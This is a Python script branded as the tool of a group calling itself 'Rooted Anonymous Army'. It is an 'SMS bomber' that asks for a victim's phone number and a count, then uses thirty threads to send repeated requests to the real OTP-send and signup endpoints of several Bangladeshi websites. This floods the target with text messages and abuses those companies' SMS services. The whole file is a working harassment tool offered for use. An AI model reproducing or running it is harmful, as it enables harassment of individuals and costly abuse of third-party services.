import os, sys, time, requests
from concurrent.futures import ThreadPoolExecutor

G = '\033[1;32m'; R = '\033[1;31m'; W = '\033[1;37m'; C = '\033[1;36m'; Y = '\033[1;33m'

def banner():
    os.system('clear')
    print(f"""{C}
    ____  ___    ___     ____
   / __ \/   |  /   |   / __/
  / /_/ / /| | / /| |  / /_  
 / _, _/ ___ |/ ___ | / __/  
/_/ |_/_/  |_/_/  |_|/_/     
{R}  [ ROOTED ANONYMOUS ARMY - OFFICIAL ]
{G}=================================={W}""")

def verified_attack(target, i):
    urls = [
        ("https://web.shajgoj.com/api/v2/auth/otp/send", {"mobile": target}),
        ("https://api.redx.com.bd/v1/user/signup", {"phone": target, "name": "RAA-USER"}),
        (f"https://www.osudpotro.com/api/v1/users/send-otp?phone={target}", None)
    ]
    try:
        requests.post(urls[0][0], data=urls[0][1], timeout=5)
        requests.post(urls[1][0], json=urls[1][1], timeout=5)
        requests.get(urls[2][0], timeout=5)
        print(f"\r{G}[✔] RAA-ATTACK SUCCESSFUL: {i+1} {W}", end="")
    except: pass

def main():
    banner()
    print(f" {C}[01]{W} SMS Bomber Engine\n {C}[02]{W} IP Tracker\n {C}[00]{W} Exit")
    choice = input(f"\n{C}[RAA-Shell]:~# {W}")
    if choice in ['1', '01']:
        target = input(f"\n{G}[+] Target Number: {W}")
        if len(target) == 10: target = "0" + target
        limit = int(input(f"{G}[+] Limit: {W}"))
        with ThreadPoolExecutor(max_workers=30) as ex:
            for i in range(limit): ex.submit(verified_attack, target, i)
        print(f"\n\n{G}[+] Done!{W}")
        input("Press Enter..."); main()
    elif choice in ['0', '00']: sys.exit()

if __name__ == "__main__":
    main()
